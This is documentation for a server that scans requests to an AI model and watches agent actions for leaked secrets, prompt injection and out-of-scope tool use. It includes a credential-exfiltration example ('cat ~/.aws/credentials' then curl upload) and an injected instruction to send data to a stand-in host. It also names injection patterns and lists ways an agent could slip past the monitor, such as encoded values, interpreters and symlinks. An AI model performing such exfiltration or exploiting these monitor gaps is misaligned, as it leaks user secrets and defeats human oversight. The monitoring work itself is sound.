# forgd-verdict: the verdict server

The server that Anthropic's Inference hooks call. Anthropic POSTs each
governed request to it before inference; in `enforce` mode it answers allow
or deny, and in the default `observe` mode it always allows and records
what it would have denied. It is the scan core, `policy.yaml` and adapter 1
from [the repository overview](../README.md). The companion reference for
the other adapters, the findings store and the dashboard is
[PLATFORM.md](PLATFORM.md).

`DESIGN.md` covers why the parts are shaped this way, `BENCH.md` holds
measured numbers, and `PROTOCOL.md` the protocol facts the code depends on.

---

## Install

```bash
# Just the CLI, on your PATH.
uv tool install --editable .

# Or a project venv. `uv venv` does not activate it: activate, or
# prefix every command below with `uv run`.
uv venv && source .venv/bin/activate
uv pip install -e '.[server]'                       # adapter 1
uv pip install -e '.[dev]'                          # + tests
uv pip install -e '.[ml-pii]'                       # T2 NER tier (adapter 3; ~600 MB model)

brew install gitleaks                               # T1 (optional; auto-detected)
```

The Claude Code hook has its own install name. `scripts/build_wheels.sh`
builds `forgd-verdict-hook` next to `forgd-verdict` in `dist/`: metadata
and one console script, pinned exactly to the core, so a laptop runs the
same detection code the server runs.

```bash
scripts/build_wheels.sh
uv pip install dist/forgd_verdict-*.whl dist/forgd_verdict_hook-*.whl
forgd-verdict-hook --help
```

This resolves the core's dependencies from the index unpinned. For a
managed laptop, install from a release with hashes as
[deploy/MDM.md](../deploy/MDM.md#what-has-to-land-on-the-machine) step 1
describes.

Python 3.11+. `PyYAML` is the only base dependency, because every subcommand
loads a policy and `load_policy` defaults to `policy.yaml`. Stdlib-first
otherwise: the server hot path has no third-party dependency (uvicorn is
imported lazily by `serve` and `dashboard`) and the Compliance client is
`urllib`.

## Quick start

```bash
# See what the core does, with no server involved.
# Exits 1 on a deny, 0 on an allow, and 3 when a blocking detector did not
# run, so it composes in a shell pipeline.
printf 'ship it with AKIAIOSFODNN7EXAMPLE' | forgd-verdict scan -

# Adapter 1, shadow-only, on :8000. The policy names its findings store
# as $FORGD_VERDICT_STORE and refuses to start while that is unset.
export WEBHOOK_SECRET='whsec_...'
export FORGD_VERDICT_STORE=./findings
forgd-verdict serve --policy policy.yaml
```

---

## Scan core

`scan(units, detectors, budget) -> ScanResult` and
`decide(findings, policy) -> Verdict`. Any `block`-severity finding denies.

### Detector tiers

| Tier | Engine | Default | Notes |
|---|---|---|---|
| T0 | built-in regex (AWS/GitHub/Anthropic/Slack/Stripe/Google keys, Claude sign-in and session tokens, PEM, JWT, SSN, PAN+Luhn) | on | stdlib, microseconds/KB |
| T1 | `gitleaks stdin` subprocess | on if the binary is present | strongest secrets coverage; config is pinned |
| T2 | Presidio NER (`[ml-pii]` extra) | on for adapter 3, and for adapter 5's redaction on the ingest image | unstructured PII; ~8.4 s per 223 KB frame |
| T2 | LLM Guard (`[ml]` extra) | off | adds torch; not deployed |

T1 always runs with a pinned `--config` and scrubbed `GITLEAKS_CONFIG*` env
vars, so scanned content cannot switch off its own scan. Custom rules go in
`detectors.gitleaks.config`.

T1 has two transports. The verdict server, the collector and the intake
service's `/scan` set `detectors.gitleaks.daemon` in their profiles to a Unix
socket and talk to `sidecar/gitleaksd`, which holds one compiled detector:
0.21 ms against the CLI's 182 ms in-image at 1 vCPU. In a Helm
deployment's intake container, under a 500m CPU limit, the CLI measured 1.12 s
per exec on 2026-09-22, of which the scan was 2.7 ms and the rest compiling
~220 rules. Laptops and the audit job use `gitleaks stdin`. The
socket alone does nothing: a role handed the socket whose profile does not
set `daemon` still shells out, and a test pins the two together.
Setting `daemon` marks the tier required, so an unreachable sidecar fails at
startup rather than becoming a silently missing tier.

gitleaks drops placeholder-shaped values on purpose. Its default config,
which the packaged baseline extends, has a global `[allowlist]` whose
`stopwords` include `abcdefghijklmnopqrstuvwxyz`, and
`Allowlist.ContainsStopWord` matches stopwords against the lowercased
secret. A fixture made of `ghp_` and `aBcDeFgHiJkLmNoPqRsTuVwXyZ0123456789`
therefore produces no gitleaks finding, on every platform and in both
transports, while T0's `github-token` rule still reports it. A "missed
`ghp_`" reported against a sequential fixture like that one is this filter,
not a broken gitleaks build. The tests pin it in both directions: one
random-looking value per rule family in `tests/data/gitleaks-t1.json` must
be reported, and the alphabet-run `ghp_` must not.

To check a laptop's gitleaks, scan a realistic random value. `--config`
pins gitleaks' default rules, because without it `gitleaks stdin` reads a
`.gitleaks.toml` from the working directory, which can allowlist anything.
The value is written as two quoted parts, which the shell joins, so this
file holds no contiguous token for a secret scanner to report:

```sh
gitleaks version
echo 'notes glpat-''V9v0M48onQvilZzFz0tS' \
  | gitleaks stdin --config <(printf '[extend]\nuseDefault = true\n') \
      --no-banner --redact --log-level error \
      --report-format json --report-path - \
  | grep RuleID
# "RuleID": "gitlab-pat",
```

No `RuleID` line means the binary is not detecting, and T1 on that laptop
contributes nothing.

T2 is enabled by `compliance.detectors` for adapter 3, and by
`otel.sink_detectors` for adapter 5's redaction only, where it runs after the
export is acknowledged. It is off on every inline path. It runs NER
entities only (`PERSON`, `LOCATION`, `EMAIL_ADDRESS`, `PHONE_NUMBER`,
`NRP`) and is gated so it never runs on source code.

Weak-shape checksum rules require a nearby label: `nhs-number`,
`aba-routing`, `canadian-sin`, `imei`. `iban` does not.

Every T0 pattern with a cheap structural check applies it before emitting:
Luhn plus an IIN check for card numbers, JOSE-header decode for JWTs, SSA
allocation rules for SSNs. This runs on every governed request in an
organization, so a false positive is a blocked user.

### Privacy invariant

Matched secrets and PII never reach logs, the timing CSV, `/metrics`,
`reference_id`, or `deny_reason`. Findings carry a detector name, a locator,
and `excerpt_hash`, and nothing else. The test suite seeds known secrets and
fails if any of them appears in one of those sinks.

Two exceptions. Archive mode writes whole frames to disk, so treat
`archive_dir` as a transcript store: 0600 files, encrypted volume, its
own retention clock. Each server process writes its own file per UTC day,
`frames-<day>-<pid>-<random>.jsonl.gz`, so a retention job should match
`frames-*.jsonl.gz`. `excerpt_hash` is salted with `privacy.hash_salt`,
and a service that logs or records findings refuses to start without one;
see [PRIVACY.md § `privacy.hash_salt`](PRIVACY.md#privacyhash_salt).

### Incremental session scanning

Prompt frames carry the cumulative transcript, so naive rescanning makes an
agentic session O(n²) in bytes. The cache is keyed on
`(tenant_id, session_id)` and holds a high-water mark plus the running
findings, so only messages past the mark are scanned.

`session_id` is best-effort and client-asserted for Claude Code. A null or
shrunk transcript is a cache miss and a full rescan. Correctness never
depends on the cache: every path degrades to a full scan, and a frame that
blew its budget is not cached at all (caching a partial scan would make the
gap permanent for the rest of the session).

The cache is behind an interface (`SessionCache`) so Redis can replace the
in-process LRU. With `--workers > 1` the LRU and the dedupe store are
per-process: correct, but less efficient. Swap the store before scaling out.

### Scan budget

`scan.budget_ms` (default 1500) is the slice of the org's verdict timeout
that scanning may consume. Past it, T2 detectors are skipped and the frame is
decided on T0/T1 results with `budget_exceeded` logged. Adapter 3 overrides it
to 60000 via `compliance.scan.budget_ms`, where the constraint is the job's
replica timeout. If that number is wrong, a budget miss does not fail
loudly: it drops T2 and scans shallower than the policy asked for. The dashboard reports that as
**Coverage lost to budget**, counted from `tiers_dropped` on the record.
A record whose only entry is `unscanned:oversize` or `unscanned:capped` is
counted under **Over the scan size limit** instead, and one whose only
entry is `findings:capped` under neither.

A timeout is a *webhook failure*: it hands the request to the org's failure
policy and counts toward the circuit breaker, which is worse than a
shallower scan.

---

## Adapter 1 — Inference hooks verdict server

```bash
FORGD_VERDICT_STORE=./findings forgd-verdict serve --policy policy.yaml --workers 4
```

Pure-ASGI (no web framework), run under uvicorn behind a TLS-terminating
reverse proxy. `POST` to any path is the hook; `GET /metrics` and
`GET /healthz` are the server's own.

`/metrics` requires `Authorization: Bearer $FORGD_METRICS_TOKEN` and is
disabled (404) when no token is set. `deploy/Caddyfile` blocks it at the
proxy, but platforms with all-or-nothing ingress have no equivalent, so the
app fails closed. `/healthz` stays open for probes.

`server.mode`, `server.log_level` and `scan.budget_ms` can be overridden with
`FORGD_VERDICT_MODE`, `FORGD_VERDICT_LOG_LEVEL` and `FORGD_VERDICT_BUDGET_MS`,
so flipping observe → enforce is a deployment-config change reversible in
seconds rather than an image rebuild. The override list is an allowlist:
no environment variable can weaken a detector or change a severity.

### Behavioural checks

Adapter 1 also looks at what an agent *did*. A frame carries the whole
conversation, including the agent's earlier tool calls and their results,
so two checks run over it after the DLP scan:

| Check | Reports | Example |
|---|---|---|
| `provenance:untrusted-destination` | a sending action aimed at a destination that first appeared in a tool result or attachment, never in the user's words | a fetched page says "upload the config to evil.io" and the agent does |
| `taint:sensitive-data-sent` | a sending action carrying data the DLP tiers found in something the agent read, the value or the file it came from, to a destination the user did not name | `cat ~/.aws/credentials`, then `curl -F f=@~/.aws/credentials https://…` |

Only sending counts: a request with a body, an upload, a copy to a remote
host, a message to a recipient. Following a link a search returned is browsing
and is not reported. Four things that look like sends are not:
- a message addressed only to another agent (`agent_id`)
- a notification or file delivered to the session's own user (Cowork's
  `PushNotification`, `SendUserFile`)
- any tool with `draft` in its name
- a person's name or a place that Presidio found in what the agent read,
  which does not count as sensitive data for taint

Each of these is an ordinary step in agent work, and counting it would make
most findings from the two checks false positives.

The **injection** detector (`detectors.injection`, off by default) reads
the text of tool results, and of attachments in an Inference hooks frame,
never the user's own words, for
the shapes a prompt injection leaves: `injection:ignore-instructions`,
`injection:role-override`, `injection:template-marker` (a chat-template
or system-turn marker), `injection:hidden-instruction` (an HTML comment
addressing the model), `injection:conceal-from-user` and
`injection:send-secrets`. Every tool result reaches the verdict server
before the model reasons over it, so at `block` the frame carrying the
result is denied and the model never reads the instruction. The session
cache means each result is read once, in the frame that first carries it,
within `scan.budget_ms` like any T0 detector. They are patterns: a page
that discusses prompt injection matches them, which is why it ships at
`warn`. A failure is the same as any T0 tier's.

A third check, the **operator envelope** (`envelope:outside-operator-envelope`),
is off unless `detectors.envelope.enabled` is true. It reports a tool call
outside what the operator listed:

```yaml
detectors:
  envelope:
    enabled: true
    severity: warn
    rules:
      - applications: [claude-code]   # source.application; omitted: any
        # actors: [user_01Abc]        # actor ids or emails; omitted: any
        tools: [bash, read, edit]     # tool names; omitted: any
        commands: [git, ls, npm]      # programs a shell tool may run
        hosts: [github.com]           # destinations, subdomains included
        path_classes: [project, /tmp] # what it may read, by class
```

The first rule that matches the frame's application and actor applies; a
frame no rule matches has no envelope. An empty `applications` or `actors`
list is refused, since it would match nothing. A path is compared by class:
`~/.<dir>` for a dot-directory in the home directory, `~` elsewhere in it,
`/<dir>` for an absolute path's first component, `project` for a relative
path, and `variable` for one a shell variable places (`$P`, `${DIR}/x`, or
`~` in a command that assigns `HOME`). The programs a shell call runs
include those it runs through `sh -c`, `eval`, `xargs`, `find -exec` and
`$(...)` or backtick substitution.

The envelope reads the call's text. A program on the list that runs code
(`python -c`, `node -e`, `make`, a script in the project, `git` with an
alias or a hook) can run anything, and a symlink, alias or function is not
resolved. An agent set on leaving the envelope can do so through any of
these. The finding
names the kind in its locator (`#tool`, `#command`, `#host`, `#path`) and
carries a salted digest of the tool, program, host or path class; no raw
command, host or path. On the intake's frame `/scan` the application is
`agent:<client>`. The Compliance and Managed Agents scanners carry no
application, so only a rule without `applications` applies to them.

Both ship at `warn`: they record and never deny. The hook sees the input to
each model call, never the response, so it sees an action one frame after it
ran. At `block` a check would halt the agent's next step, not stop the request
already sent. They are there to be measured first.

#### Moving a behavioural check to `block`

A check moves to `block` only when its findings are known to be right often
enough that halting the agent is the better outcome. Before changing it,
measure in your own deployment, at `warn`:

- **How often it fires.** Findings per thousand frames over at least two
  working weeks, per application, from the dashboard's Detectors table.
  Two weeks covers the release cycle and the monthly jobs agents run.
- **How many are right.** Review a sample of at least fifty findings, or
  all of them if fewer, by `request_id` in the Event Log, and count the
  ones where the agent was acting for someone other than its user, or
  outside what its operator meant it to do. Move a check only when nearly
  all are; a false positive at `block` stops a person's work mid-task.
- **What the false ones share.** A tool, a destination or a workflow that
  accounts for most of them is added to `provenance.allow_hosts` or to the
  envelope's rule, and the measurement repeats.
- **What halting costs.** At `block` the check denies the agent's next
  step, not the action already taken (the hook sees each action one frame
  after it ran). Confirm the application handles a deny mid-task: the
  user sees the deny reason and the session can continue or be restarted.

Move one check, for one application if its rule allows, and watch its deny
rate for a week before the next. `envelope` is the closest to deterministic
of the three, since it compares against a list the operator wrote, and is
the natural first candidate once its rules are complete.

Findings carry the detector id, a structural locator and a salted digest,
never a destination, path or value. The checks run after the DLP scan with
their own limits: 1 MiB and 20,000 nodes per block, at most 250 ms per frame
or what is left of `scan.budget_ms` if that is less, and at most 10,000
hosts kept per session for each of the user-named and untrusted sets. Their
cost is linear in what they read. The deadline is checked per block and
inside each block, and a session's next frame resumes at the block where the
last one stopped.

A frame whose pass stopped at the deadline, or raised, is not reported as
clean: `provenance` and `taint` (whichever are on) are added to
`tiers_dropped`, so `server.on_tier_dropped: deny` denies the frame when the
dropped check is at `block`, and the stored row records it either way. A
stop at the deadline is counted as `provenance_cut_short`, a failure as
`provenance_error`, and both are logged. Once a session's untrusted-host set
is full, every send to a host the user did not name is reported. Configure
the checks under `server.detectors.provenance` and `server.detectors.taint`.

What reads as a send: `curl`, `wget`, `httpie`/`xh`, PowerShell's
`Invoke-WebRequest`, `nc`/`socat`/`telnet`, `ssh`/`sftp`/`scp`/`rsync`, the
mail tools, and interpreter one-liners that post. Combined short flags
(`curl -sd`, `-LT`, `-sXPOST`), wrappers (`sudo`, `timeout 5`, `env`,
`nohup`, `xargs`), `sh -c '…'` and `eval`, a destination without a scheme
(`curl -d @f host/path`, `ssh host`), numeric and IPv4-mapped IP forms, and a
`$NAME` assigned earlier in the same command are all read. A tool counts as a
shell by its name (`run_shell`, `terminal_exec`, `execute_command`) or its key
(`command`, `cmd`, `script`, `*_command`); a tool whose input names `method:
POST|PUT|PATCH` and a URL counts as sending. A shell send whose destination
cannot be read (`curl -d @f "$(cat endpoint)"`) is a send with no
destination: taint applies to it with no exemption. A fetch that carries a
sensitive value in its URL is reported by taint, not by provenance.

A bare hostname in the user's own words is a trust root only if its last
label is a generic or two-letter TLD and not a file extension: `setup.sh`,
`README.md` and `main.rs` do not trust `x.setup.sh`. A URL or an address in
the user's text is a trust root as written.

Known limits: a value transformed before sending (hex, splitting) does not
match its digest (base64 does, since the core decodes it); symlinks are not
resolved; `cat a b` taints both files.

### Modes

| Mode | Behaviour |
|---|---|
| `observe` | always allow, still scan and log; a would-be deny is recorded as `shadow_action` — server-side shadow, independent of the org's own Shadow mode |
| `enforce` | real verdicts |
| `archive` | always allow, persist frames to disk after responding |

### Protocol contract implemented

Verified 2026-09-17 against the live docs (see `PROTOCOL.md` for the hook
and gitleaks contracts and the `config-test` probe):

* HTTP 200 + JSON for both allow and deny. A non-200 is a webhook
  failure, not a deny, and sustained failures trip the circuit breaker.
* `type: "tool_call"` → the tool calls in one model response, sent with
  **Validate tool calls** on (the default). `messages` holds only the
  assistant message with one `tool_use` block per call, and one verdict
  covers every call in it. It is scanned whole, as below, without the
  session cache or the transcript checks, and counted as `tool_call_frames`.
* Unknown top-level `type`, or none → answered with 200, never refused for
  being unknown.
  The frame is scanned whole: `messages` as a transcript when it is a
  list, and every other field outside the envelope (`type`, `request_id`,
  `tenant_id`, `actor`, `source`, `session_id`, `model`) walked as text.
  It is then decided, recorded and deduplicated like a prompt, so a
  credential in it denies in `enforce`. It is counted as
  `unknown_frame_type`.
* Unknown block types and unknown fields → accepted, never refused for
  being unknown. Their string fields are still scanned, because a new block
  type is exactly where new exfiltration surface appears, and a finding in
  one is enforced like any other: it denies in `enforce`.
* `source.application == "config-test"` (connection test and circuit-breaker
  recovery probe) is answered normally.
* Standard Webhooks signature over the raw bytes, standard-alphabet
  base64 secret, ±300s, any space-separated `v1,<b64>` candidate, two active
  secrets for the ~1 minute rotation overlap.
* Dedupe on `webhook-id`; the single connection-failure retry reuses it.
* Bodies to 64 MiB. Your reverse proxy must agree: nginx defaults to
  1 MB, and a rejected body is a webhook failure, so under *Allow the request*
  an oversized prompt reaches the model uninspected.
* `deny_reason` ≤500 chars, `reference_id` ≤50 chars from `[A-Za-z0-9._:/-]`.
  The server sanitizes before returning: a malformed `reference_id` is
  silently dropped on Anthropic's side, which would break the Activity Feed join.
* Extra verdict fields are ignored by Anthropic, so the server also
  returns `findings_count` for its own tooling.

### Failure behaviour

Signature failure → 401. Unparseable body → 400. Oversized body → 413. All
three are webhook failures: the org's own failure handling (fail
open or fail closed) is the right place for that decision, and a silent allow
would hide a misconfiguration. `require_signature: true` with no usable
secret returns 503 and logs loudly, so it surfaces at connection-test
time.

A request the pre-auth body budget has no room for → 503 `busy` with
`Retry-After: 1`, and a body that has not arrived within
`server.body_read_timeout_s` → 503 `body_timeout`; see [Memory](#memory).
Both are webhook failures too. Anthropic retries a hook request only after
a connection failure, so the prompt is decided by the org's failure
handling.

On an internal scan error, `observe`/`archive` allow; `enforce` follows
`server.on_internal_error` (`fail` → non-200 → org policy decides; `allow` →
silent allow).

### Memory

The signature covers the raw body, so the server reads a body before it
knows who sent it. Anyone who can reach the hook URL can send a body with
fresh `webhook-*` headers and a signature that will not verify. The server
bounds what those requests can make it hold:

- `server.preauth_body_budget_bytes` (256 MiB) caps the request body held,
  across every request, until its signature is verified. Each chunk is
  counted as it arrives, and a request's share is returned once its
  signature is checked, whatever the outcome, or when the connection drops.
  A request that declares a `content-length` the budget has no room for,
  or arrives while it is full, is answered 503 `busy` without its body
  being read. A body that fills it partway is answered 503 and the rest is
  not read. Every refusal is counted as `preauth_budget_exhausted` on
  `/metrics` and logged as a warning, and `/metrics` reports the budget,
  the bytes held now and the most held at once under `preauth_body`.
- `server.max_body_bytes` (64 MiB, the protocol maximum) caps one body. A
  declared `content-length` over it is answered 413 without a read.
- `server.body_read_timeout_s` (15 s) caps how long a body may take to
  arrive. Anthropic's verdict timeout is at most 10 s for the whole
  exchange.
- `server.limit_concurrency` (1024) is passed to uvicorn, which answers 503
  to connections and requests past it before the app sees them.

The shipped memory limit for the verdict server is 2 GiB on every target.
Joining a body's chunks makes a second copy for a moment, so unsigned
requests can make the process hold up to twice the budget, about 512 MiB.
The rest is the process itself (about 100 MiB at rest), gitleaksd, which
runs in the same container, and the frames being scanned after their
signature verified, whose parsed form is several times their size. Raise
the budget only together with the memory limit, and keep it at least
`max_body_bytes`, which the server checks at startup.

The budget turns a flood of unsigned bodies from an out-of-memory restart
into 503s, and a 503 is still a webhook failure. A caller who keeps the
budget full by sending real bytes, 256 MiB every 15 seconds with the
shipped settings (a share is held until `body_read_timeout_s`), makes
governed prompts fail for as long as they keep it up, and under *Allow the
request* those prompts reach the model ungoverned. The control for that is
the source allowlist below: with it, only Anthropic's egress range can make
the server read a body at all.

### Deploy

`deploy/Dockerfile` builds two targets from one commit:

| Target | Roles | Size | Contents |
|---|---|---|---|
| `base` | server, dashboard | ~200 MB | scan core + gitleaks |
| `ingest` | adapter 3 job | ~1.4 GB | the same, plus Presidio and `en_core_web_lg` |

Two targets rather than two Dockerfiles, both built in the same job, so the
scan core cannot drift between the inline and post-hoc control points. Always
pass `--target`: `ingest` is the last stage, so a bare `docker build` puts the
1.4 GB image behind the inference hook.

The `ingest` stage ends by running `deploy/assert_presidio.py`, which
constructs the analyzer and requires real findings from both the NER and the
pattern path. Without it a failed model download would ship an image whose T2
tier is absent with no error. The detector reports itself unavailable so that
`enabled: auto` degrades instead of taking the job down, which is right at
runtime and wrong at build time. The script also asserts the entity
identifiers `policy.yaml` names: Presidio ignores an entity it does not
recognize rather than raising, so a rename would pass startup and drop
that entity at scan time.

Both targets install their Python packages from hashed requirement files
in `deploy/constraints/`, with no resolution at build time: `base.txt` for
`base`, `ingest.txt` (base's pins plus ml-pii and the spaCy model's wheel
URL) for `ingest`, and `build.txt` for the build backend that builds the
forgd-verdict wheel. A dependency change in `pyproject.toml` needs
`scripts/compile_constraints.sh`, which keeps every pin that still satisfies
it; `scripts/compile_constraints.sh --upgrade` moves every pin to the newest
allowed version. CI runs it with `--check` and fails when the files are out
of date. The model's version and sha256 are in `deploy/constraints/ingest.in`
and are changed by hand, to a model release that matches the pinned spaCy.

`deploy/Caddyfile` is a working reference. Required:
a publicly routable host, a public-CA certificate, port 443, no redirects on
the hook path, and a 64 MiB body limit. Reverse tunnels (ngrok and similar)
are blocked by Anthropic's network policy; do not test through one.

**Recommended: allowlist Anthropic's Inference hooks egress range on the
hook path**, as published on [Anthropic's IP addresses
page](https://platform.claude.com/docs/en/api/ip-addresses). The server has to
read a body before it can verify the signature, so without the allowlist
anyone on the internet can make it read up to the pre-auth budget and fill
it ([Memory](#memory)). It ships off because a stale range fails every
governed prompt: check Anthropic's published IP addresses before turning it
on, and again whenever they change. The block carries Anthropic egress
beyond Inference hooks, so it narrows exposure and is not a substitute for
signature verification.

| Where | How |
|---|---|
| `deploy/Caddyfile` | uncomment the `@not_anthropic` matcher and its `respond` |
| Helm chart, ingress-nginx | `ingress.hook.sourceRanges`, a list of CIDRs (`["192.0.2.0/24"]` shape, with Anthropic's range). `/hook` moves to an Ingress object of its own carrying `whitelist-source-range`; `/v1`, `/intake` and `/scan` stay open, because laptops reach them from anywhere |
| Helm chart, `ingress.className: gce` | refused by the chart; attach a Cloud Armor policy to the verdict server's backend |
| Container Apps, ECS, Cloud Run | the platform's ingress IP restrictions or a WAF rule on the hook path, where the platform offers one |


When `server.store` is set, each verdict's findings are queued for the
store described in
[PLATFORM.md § Findings store and dashboard](PLATFORM.md#findings-store-and-dashboard).
A background thread writes them off the hot path; a full queue or a storage
outage drops records rather than delaying a verdict. Findings only, never
content.

The verdict is answered before the write, so the write is at-most-once: a
failed write is retried twice and then dropped. `/metrics` counts dropped
records under `store.dropped` and failed writes under `store.errors`, and
each failed write logs the WARNING `store flush failed` with a
`dropped_total` field. The collector (adapter 4) also answers before the
write, but its writer retries a failed write until the store takes it and
the collector answers `503` meanwhile; see
[PLATFORM.md § Adapter 4](PLATFORM.md#adapter-4--otel-collector).

---

## Configuration

A single `policy.yaml`; see the annotated file in the repo root. Shared
sections (`detectors`, `scan`, `privacy`, `deny`) drive the core for every
adapter; `server:`, `hook:`, `compliance:`, `otel:`, `intake:` and `sinks:`
are adapter-specific.

Changing the policy is a configuration change, not a rebuild. The image
carries a copy so a bare `docker run` starts, but every deployment path
replaces it:

| Path | How the policy arrives | Takes effect |
|---|---|---|
| Helm | `--set-file policy.inline=policy.yaml` → a ConfigMap mounted into each role | on `helm upgrade`: every pod template carries a checksum of the ConfigMap, so an edit rolls the pods |
| Terraform (`app-aca`) | `policy_yaml = file("policy.yaml")` → gzipped into `FORGD_POLICY_INLINE_GZ`, decoded by the entrypoint | on `terraform apply`: the env change is a new revision |
| Terraform (`app-cloudrun`) | `policy_yaml`, as for `app-aca` | on `terraform apply`: the env change is a new revision |
| Terraform (`app-ecs`) | `policy_yaml`, as for `app-aca`, in each task definition's environment | on the next `scripts/deploy_aws.sh` roll after `terraform apply`. The apply registers a new task definition revision, which the services ignore; the roll registers its revision from the family's latest, so it carries the new policy |
| `docker run` | `-v "$PWD/policy.yaml:/app/policy.yaml:ro"` | on restart |

Infrastructure lives in `values.yaml` or `terraform.tfvars`. The policy
describes behaviour and is the same file on every target. It is readable
by anyone who can read the ConfigMap, which is right for detectors,
thresholds and budgets, and is why every credential in it is a `$VARIABLE`
reference. The test suite enforces that for the shipped file; a fork that
pastes a key into its own copy has put that key in a ConfigMap.

`forgd-verdict policy` prints the effective merged policy with secrets
redacted, and so does the dashboard's Policy tab. Both show an org id as
its `$FORGD_ORG_ID_*` reference, and any other configured value as
`<org id>`.

